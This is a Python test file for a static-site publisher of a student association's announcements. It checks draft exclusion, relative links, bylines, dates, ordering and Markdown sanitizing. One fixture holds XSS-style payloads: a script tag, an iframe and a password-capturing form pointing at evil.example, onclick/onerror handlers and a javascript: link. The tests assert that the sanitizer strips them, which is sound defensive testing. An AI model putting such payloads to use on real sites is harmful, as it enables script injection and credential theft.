"""T03: Published Posts go Live on the public site.

Seam 2 (the published site on disk): seed Posts, call the publish step into a
temporary folder, and read the HTML files it wrote. Nothing here looks at
internal functions or templates.
"""
import re
import sqlite3

from app import accounts, posts
from app.publish import render_site

WELCOME = "primarily for African students and students with African backgrounds"


def author_id(db_path, username="editor"):
    with sqlite3.connect(db_path) as conn:
        return conn.execute("SELECT id FROM users WHERE username = ?",
                            (username,)).fetchone()[0]


def add_post(db_path, title, body="What: music", *, published=True, by="editor"):
    post_id = posts.create(db_path, title=title, body=body,
                           author_id=author_id(db_path, by))
    if published:
        posts.publish(db_path, post_id)
    return post_id


def site_files(out):
    return sorted(p for p in out.rglob("*") if p.is_file())


def all_text(out):
    return "\n".join(p.read_text() for p in site_files(out)
                     if p.suffix in (".html", ".css"))


def html_files(out):
    return [p for p in site_files(out) if p.suffix == ".html"]


def read(out, name):
    return (out / name).read_text()


def titles_in_order(html):
    """The Event card titles in the order they appear on the page."""
    return re.findall(r'<h2 class="card-title"><a [^>]*>([^<]+)</a>', html)


def publish(db_path, tmp_path):
    return render_site(tmp_path / "site", database=db_path)


# -- what is written ---------------------------------------------------------

def test_publish_writes_home_announcements_and_one_page_per_post(db_path, tmp_path):
    add_post(db_path, "Afrobeat Night")
    add_post(db_path, "Movie Evening")
    out = publish(db_path, tmp_path)
    assert (out / "index.html").exists()
    assert (out / "announcements.html").exists()
    assert (out / "style.css").exists()
    assert "Afrobeat Night" in read(out, "posts/afrobeat-night.html")
    assert "Movie Evening" in read(out, "posts/movie-evening.html")


def test_home_page_has_the_welcome_text(db_path, tmp_path):
    out = publish(db_path, tmp_path)
    assert WELCOME in read(out, "index.html")


def test_home_shows_the_five_latest_and_links_to_all_announcements(db_path, tmp_path):
    for n in range(1, 8):
        add_post(db_path, f"Post number {n}")
    out = publish(db_path, tmp_path)
    home = read(out, "index.html")
    assert titles_in_order(home) == [f"Post number {n}" for n in (7, 6, 5, 4, 3)]
    assert 'href="announcements.html"' in home
    assert len(titles_in_order(read(out, "announcements.html"))) == 7


# -- Drafts never leave the database ---------------------------------------

def test_a_draft_appears_nowhere_in_the_export(db_path, tmp_path):
    add_post(db_path, "Secret Plans Draft", "Hidden body text zebra", published=False)
    add_post(db_path, "Afrobeat Night")
    out = publish(db_path, tmp_path)
    text = all_text(out)
    for needle in ("Secret Plans", "secret-plans", "Hidden body", "zebra"):
        assert needle not in text
    assert not (out / "posts" / "secret-plans-draft.html").exists()
    assert not any("secret-plans" in p.name for p in site_files(out))


def test_an_unpublished_post_disappears_on_the_next_publish(db_path, tmp_path):
    post_id = add_post(db_path, "Wrong Announcement", "wrong details")
    assert (publish(db_path, tmp_path) / "posts/wrong-announcement.html").exists()
    posts.unpublish(db_path, post_id)
    out = publish(db_path, tmp_path)
    assert "Wrong Announcement" not in all_text(out)
    assert "wrong details" not in all_text(out)
    assert not (out / "posts/wrong-announcement.html").exists()


def test_a_site_with_no_published_posts_says_so(db_path, tmp_path):
    add_post(db_path, "Only a draft", published=False)
    out = publish(db_path, tmp_path)
    assert "Only a draft" not in all_text(out)
    assert titles_in_order(read(out, "announcements.html")) == []
    assert "No announcements yet" in read(out, "announcements.html")


# -- Markdown is sanitized -----------------------------------------------------

DANGEROUS = """\
## Heading two

Some *emphasis* and **strong** text.

- one
- two

[a link](https://example.org/x) and ![A crowd dancing](photos/dance.jpg)

<script>alert('xss-marker')</script>
<iframe src="https://evil.example/frame"></iframe>
<form action="https://evil.example/steal"><input name="pw"><button>Go</button></form>
<p onclick="steal()">clicky</p>
<img src="photos/x.jpg" alt="x" onerror="steal()">
[bad](javascript:alert(1))
"""


def test_markdown_is_rendered_and_dangerous_html_is_stripped(db_path, tmp_path):
    add_post(db_path, "Rich Post", DANGEROUS)
    out = publish(db_path, tmp_path)
    page = read(out, "posts/rich-post.html")
    # kept
    assert "<h2>Heading two</h2>" in page
    assert "<em>emphasis</em>" in page and "<strong>strong</strong>" in page
    assert "<li>one</li>" in page
    assert '<a href="https://example.org/x"' in page
    assert re.search(r'<img [^>]*src="photos/dance.jpg"[^>]*alt="A crowd dancing"', page) \
        or re.search(r'<img [^>]*alt="A crowd dancing"[^>]*src="photos/dance.jpg"', page)
    # stripped: nowhere in the export, not just on the Post's own page
    text = all_text(out).lower()
    for needle in ("<script", "xss-marker", "<iframe", "evil.example", "<form",
                   "<input", "<button", "onclick", "onerror", "steal()", 'href="javascript'):
        assert needle not in text, needle
    # text inside a stripped form goes with it
    assert ">Go<" not in text and "Go\n" not in text.replace("</", "\n")
    # a javascript: address is never turned into a link (it stays plain text)
    assert not re.search(r"<a [^>]*javascript", text)


def test_html_in_a_title_is_shown_as_text_not_run(db_path, tmp_path):
    add_post(db_path, "<b>Bold</b> & Co")
    out = publish(db_path, tmp_path)
    assert "<b>Bold</b>" not in all_text(out)
    assert "&lt;b&gt;Bold&lt;/b&gt;" in all_text(out)


# -- every href and src is relative ------------------------------------------

def test_every_href_and_src_is_relative(db_path, tmp_path):
    body = "[admin](/admin) ![x](/img/x.png \"t\") [ok](docs/info.html) " \
           "[//host](//evil.example/x) [web](https://example.org)"
    add_post(db_path, "Links Post", body)
    add_post(db_path, "Another")
    out = publish(db_path, tmp_path)
    found = 0
    for path in html_files(out):
        for value in re.findall(r'(?:href|src)="([^"]*)"', path.read_text()):
            found += 1
            assert not value.startswith("/"), f"{path.name}: {value}"
    assert found > 5


def test_pages_in_a_subfolder_reach_the_stylesheet_and_home_relatively(db_path, tmp_path):
    add_post(db_path, "Afrobeat Night")
    page = read(publish(db_path, tmp_path), "posts/afrobeat-night.html")
    assert 'href="../style.css"' in page
    assert 'href="../index.html"' in page
    assert 'href="../announcements.html"' in page


# -- byline and dates ------------------------------------------------------------

def test_byline_is_the_display_name_and_never_the_username(db_path, tmp_path):
    accounts.create_account(db_path, username="kwame_private", password="long-enough-pw",
                            role="editor", display_name="ASA Events Team")
    add_post(db_path, "Afrobeat Night", by="kwame_private")
    out = publish(db_path, tmp_path)
    for name in ("posts/afrobeat-night.html", "announcements.html", "index.html"):
        assert "ASA Events Team" in read(out, name)
    assert "kwame_private" not in all_text(out)


def test_byline_follows_a_display_name_change_and_keeps_a_deactivated_authors_post(
        db_path, tmp_path):
    add_post(db_path, "Afrobeat Night", by="editor")
    accounts.set_active(db_path, "editor", False)
    with sqlite3.connect(db_path) as conn:
        conn.execute("UPDATE users SET display_name = 'ASA Team' WHERE username = 'editor'")
    out = publish(db_path, tmp_path)
    assert "ASA Team" in read(out, "posts/afrobeat-night.html")
    assert "ASA Events Team" not in all_text(out)


def test_first_published_date_is_shown_and_is_not_labelled_as_the_event_date(
        db_path, tmp_path):
    post_id = add_post(db_path, "Afrobeat Night")
    out = publish(db_path, tmp_path)
    day = posts.get(db_path, post_id)["first_published_at"][:10]
    for name in ("posts/afrobeat-night.html", "announcements.html"):
        html = read(out, name)
        assert f'datetime="{day}"' in html
        assert "Posted" in html
    text = all_text(out).lower()
    assert "event date" not in text and "date of event" not in text


# -- ordering -------------------------------------------------------------------

def test_announcements_are_newest_first_by_first_published_date(db_path, tmp_path):
    first = add_post(db_path, "Written first", published=False)
    second = add_post(db_path, "Written second", published=False)
    third = add_post(db_path, "Written third", published=False)
    # Published in a different order from the order they were written.
    posts.publish(db_path, second)
    posts.publish(db_path, third)
    posts.publish(db_path, first)
    out = publish(db_path, tmp_path)
    assert titles_in_order(read(out, "announcements.html")) == [
        "Written first", "Written third", "Written second"]


def test_editing_after_publishing_does_not_reorder_and_shows_updated(db_path, tmp_path):
    oldest = add_post(db_path, "Oldest")
    add_post(db_path, "Middle")
    add_post(db_path, "Newest")
    before = titles_in_order(read(publish(db_path, tmp_path), "announcements.html"))
    assert before == ["Newest", "Middle", "Oldest"]

    posts.update(db_path, oldest, title="Oldest", body="Corrected time: 7pm")
    out = publish(db_path, tmp_path)
    announcements = read(out, "announcements.html")
    assert titles_in_order(announcements) == before
    assert "Corrected time: 7pm" in read(out, "posts/oldest.html")
    # Only the corrected Post carries an Updated date.
    assert read(out, "posts/oldest.html").count("Updated") == 1
    assert "Updated" not in read(out, "posts/middle.html")
    assert announcements.count("Updated") == 1


def test_a_post_unpublished_and_republished_keeps_its_place(db_path, tmp_path):
    first = add_post(db_path, "First")
    add_post(db_path, "Second")
    posts.unpublish(db_path, first)
    posts.publish(db_path, first)
    out = publish(db_path, tmp_path)
    assert titles_in_order(read(out, "announcements.html")) == ["Second", "First"]


def test_a_post_never_edited_after_publishing_has_no_updated_date(db_path, tmp_path):
    post_id = add_post(db_path, "Draft polished first", published=False)
    posts.update(db_path, post_id, title="Draft polished first", body="fixed while draft")
    posts.publish(db_path, post_id)
    out = publish(db_path, tmp_path)
    assert "Updated" not in read(out, "posts/draft-polished-first.html")
